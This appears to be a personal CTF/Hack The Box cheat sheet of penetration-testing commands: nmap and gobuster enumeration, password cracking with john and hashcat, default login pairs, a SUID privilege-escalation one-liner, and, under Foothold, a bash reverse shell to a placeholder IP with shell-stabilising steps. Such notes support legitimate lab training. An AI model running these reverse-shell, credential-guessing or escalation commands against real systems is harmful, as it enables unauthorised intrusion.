### Enumeration
    - Ping -c3 (target)
    - Nmap (nmap -sV -sC [target IP]) (-sV version of the service running, -sC run some scripts)
    - echo "10.129.180.37 s3.thetoppers.htb" | sudo tee -a /etc/hosts

    - !!! Brute-force 
        - dir enum: gobuster (gobuster dir --url http://{target ip}/ --wordlist {wordlist path} -x {file type ex: php,html})
	- sub-domains enum: gobuster (gobuster vhost -w {wordlist ex: subdomains-top1million-5000.txt} -u
http://{target domain} --append-domain)
    - !!! Password crack
	- john -wordlist={path/to/rockyou.txt} hashes
	- zip2john {zip file}
	- hashcat 
	- hashid
    - SQLi
	- sqlmap 

ip -4 -br a
watch ip -4 -br a
ip route
traceroute [url] 
mtr
ethtool
btop
guake
vim /etc/hosts
micro
/usr/share/webshells/
nc -lnvp (port)
find / -type f -name (flag) 2>/dev/null
find / -type f -user root -perm -4000 2>/dev/null
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
### Foothold
    - Login Page
        - admin:admin
        - guest:guest
        - user:user
        - root:root
        - administrator:password
    - After a successful reverse shell upload
	- python3 -c 'import pty;pty.spawn("/bin/bash")' - functional shell - 
    - Stable bash + sudo nc -lvnp 443
	- bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
	- script /dev/null -c bash